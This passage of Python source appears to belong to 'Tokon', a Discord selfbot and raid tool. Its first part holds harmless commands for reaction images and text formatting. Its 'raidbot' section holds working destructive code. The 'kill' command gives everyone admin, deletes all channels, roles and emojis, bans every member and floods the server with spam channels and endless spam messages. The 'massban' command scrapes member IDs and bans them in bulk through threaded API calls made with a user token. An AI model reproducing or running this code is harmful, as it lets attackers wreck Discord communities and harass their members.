                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def smug(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/smug")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_smug.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def pat(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/pat")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_pat.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def kiss(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/kiss")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_kiss.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def purge(ctx, amount: int):
            await ctx.message.delete()
            async for message in ctx.message.channel.history(limit=amount).filter(
                    lambda m: m.author == Tokon.user).map(
                lambda m: m):
                try:
                    await message.delete()
                except:
                    pass

        @Tokon.command()
        async def reverse(ctx, *, message):
            await ctx.message.delete()
            message = message[::-1]
            await ctx.send(message)

        @Tokon.command()
        async def shrug(ctx):
            await ctx.message.delete()
            shrug = r'¯\_(ツ)_/¯'
            await ctx.send(shrug)

        @Tokon.command()
        async def lenny(ctx):
            await ctx.message.delete()
            lenny = '( ͡° ͜ʖ ͡°)'
            await ctx.send(lenny)

        @Tokon.command()
        async def flip(ctx):
            await ctx.message.delete()
            tableflip = '(╯°□°）╯︵ ┻━┻'
            await ctx.send(tableflip)

        @Tokon.command()
        async def unflip(ctx):
            await ctx.message.delete()
            unflip = '┬─┬ ノ( ゜-゜ノ)'
            await ctx.send(unflip)

        @Tokon.command()
        async def bold(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('**' + message + '**')

        @Tokon.command()
        async def spoil(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('||' + message + '||')

        @Tokon.command()
        async def underline(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('__' + message + '__')

        @Tokon.command()
        async def italicize(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('*' + message + '*')

        @Tokon.command()
        async def wave(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('~~' + message + '~~')

        @Tokon.command()
        async def greyembed(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('> ' + message)

        @Tokon.command()
        async def onelayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('`' + message + "`")

        @Tokon.command()
        async def twolayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('``' + message + "``")

        @Tokon.command()
        async def threelayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('```' + message + "```")

        @Tokon.command()
        async def rolecolor(ctx, *, role: discord.Role):
            await ctx.message.delete()
            await ctx.send(f"{role.name} : {role.color}")

        @Tokon.command()
        async def empty(ctx):
            await ctx.message.delete()
            await ctx.send(chr(173))

        @Tokon.command()
        async def everyone(ctx):
            await ctx.message.delete()
            await ctx.send('https://@everyone@google.com')


        @Tokon.command()
        async def nitro(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(Nitro())
            else:
                await ctx.send('***Premium Invalid***')

        if __name__ == '__main__':
            Init()
        launch()
    if cmd == "raidbot":
        TokonPrint('kill')
        TokonPrint('massban')
        pp()
        launch()
    if cmd == "kill":
        killbot = discord.Client()
        killbot = commands.Bot(command_prefix=".")
        logoprincipal()
        TokonPrint("                   Discord Commands = .stop, .kill, .admin")
        TokonPrint("                   You Must Have a Token Bot Valid !")
        username73 = input(f"{TokonInput}Enter Your Full Discord Username : ")
        @killbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            TokonPrint(f"{client.user.name} has logged out successfully." + Fore.RESET)
        @killbot.command()
        async def kill(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name="@everyone")
                await role.edit(permissions=discord.Permissions.all())
                TokonPrint(f"I have given everyone admin.")
            except:
                TokonError(f"I was unable to give everyone admin")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    TokonPrint(f"{channel.name} was deleted." + Fore.RESET)
                except:
                    TokonError(f"{channel.name} was NOT deleted." + Fore.RESET)
            for member in guild.members:
                try:
                    await member.ban()
                    TokonPrint(f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
                except:
                    TokonError(f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
            for role in guild.roles:
                try:
                    await role.delete()
                    TokonPrint(f"{role.name} Has been deleted" + Fore.RESET)
                except:
                    TokonError(f"{role.name} Has not been deleted" + Fore.RESET)
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    TokonPrint(f"{emoji.name} Was deleted" + Fore.RESET)
                except:
                    TokonError(f"{emoji.name} Wasn't Deleted" + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
                user = ban_entry.user
                try:
                    await user.unban(username73)
                    TokonPrint(f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
                except:
                    TokonError(f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("Tokon Killer")
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age=0, max_uses=0)
                TokonPrint(f"New Invite: {link}")
            amount = 20
            for i in range(amount):
                await guild.create_text_channel(random.choice(SPAM_CHANNEL))
            TokonPrint(f"{guild.name} Successfully.")
            return

        @killbot.command()
        async def admin(ctx):
            await ctx.message.delete()
            member = ctx.message.author
            role = await ctx.message.guild.create_role(name="Universe")
            roll = discord.utils.get(ctx.message.guild.roles, name="Universe")
            await roll.edit(permissions=discord.Permissions.all())
            await member.add_roles(role)

        @killbot.event
        async def on_guild_channel_create(channel):
            while True:
                await channel.send(random.choice(SPAM_MESSAGE))

        bottoken = input(f"{TokonInput}Token Bot Valid : ")
        killbot.run(bottoken)
        launch()
    if cmd == "massban":
        token = decode('')
        banlogs = token
        guildid = int(input(f'{TokonInput}Enter guild id: '))

        intents = discord.Intents.all()
        intents.members = True

        headers = {'Authorization': f'{banlogs}'}
        client = commands.Bot(command_prefix="l", case_insensitive=False, self_bot=True, intents=intents)
        client.remove_command("help")

        membercount = 0
        i = 0

        @client.event
        async def on_ready():
            await guild()

        async def menuban():
            guild = guildid
            txt = open('St/e1/massban/userscrape.txt')
            for member in txt:
                threading.Thread(target=massban, args=(guild, member,)).start()
            txt.close()
            time.sleep(4)

        def massban(guild, member):
            i = 0
            membercount = 0
            while True:
                r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        while i < membercount:
                            i += 1
                            if i == 1:
                                print(" [¤] %dst user has been banned" % (i))
                            elif i == 2:
                                print(" [¤] %dnd user has been banned" % (i))
                            elif i == 3:
                                print(" [¤] %drd user has been banned" % (i))
                            else:
                                print(" [¤] %dth user has been banned" % (i))
                        break
                    else:
                        break

        async def main():
            if len(sys.argv) < 2:
                sys.stdout.write(f'''

            [¤] Connected as: {client.user} (USER)
            [¤] Guild: {guildid}

            ''')
            await menuban()
            await guild()

        async def guild():
            i = 0
            membercount = 0
            await client.wait_until_ready()
            ob = client.get_guild(guildid)
            members = await ob.chunk()
            os.remove("St/e1/massban/userscrape.txt")

            with open('St/e1/massban/userscrape.txt', 'a') as txt:
                for member in members:
                    txt.write(str(member.id) + "\n")
                    membercount += 1
                if membercount == 1:
                    print(f''' 
         [¤] Successfully scraped {membercount} member in total''')
                else:
                    print(f''' 
         [¤] Successfully scraped {membercount} members in total''')
                txt.close()
                time.sleep(1)
                await main()

        def check():
            try:
                client.run(banlogs, bot=False)
            except:
                TokonPrint('Invalid Token')
                time.sleep(2)
                launch()
        check()
    if cmd == "music":
        TokonPrint('configmusic')
        TokonPrint('playlistmusic')
        pp()
        launch()
    if cmd == "configmusic":
        logoprincipal()
        os.system('St\e5\config\music.json')
        launch()
    if cmd == "playlistmusic":
        logoprincipal()
        os.system('St\e5\playlist')
        launch()
    if not cmd == "menu":
        launch()

ff()
launch()
